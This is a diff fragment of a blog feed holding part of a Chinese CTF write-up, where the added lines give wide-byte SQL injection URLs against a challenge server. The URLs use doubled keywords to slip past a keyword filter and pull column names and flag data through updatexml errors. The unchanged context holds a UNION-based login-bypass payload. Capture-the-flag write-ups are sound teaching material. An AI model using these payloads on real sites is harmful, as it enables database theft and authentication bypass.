@@ -23,6 +23,8 @@
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="string">'$name'</span>	//<span class="keyword">sql</span>查询语句</span><br><span class="line"></span><br><span class="line"><span class="keyword">name</span>:<span class="number">0</span><span class="string">' union select 1,'</span><span class="keyword">admin</span><span class="string">','</span>c4ca4238a0b923820dcc509a6f75849b<span class="string">'#</span></span><br><span class="line"><span class="string">pw:1	//payload</span></span><br></pre></td></tr></table></figure>
 
 <p>6.web6<br>sql宽字节注入，关键字过滤，双写绕过</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10008/search.php?name=%df' and updatexml(1,concat(1,substr((selselectect group_concat(column_name) from information_schema.columns whwhereere table_name=char(102,49,52,103)),1,32)),1)<span class="comment">-- -&amp;pw=1	//查列名</span></span><br><span class="line">http://183.129.189.60:10008/search.php?name=%df' and updatexml(1,concat(1,substr((selselectect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1),1,32)),1)<span class="comment">-- -&amp;pw=1	//查数据</span></span><br><span class="line">http://183.129.189.60:10008/search.php?name=%df' and updatexml(1,concat(1,substr((selselectect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1),32,32)),1)<span class="comment">-- -&amp;pw=1	//查数据</span></span><br></pre></td></tr></table></figure>
+
 <p>7.web7<br>phar://配合反序列化rce</p>
 ]]></content>
       <tags>
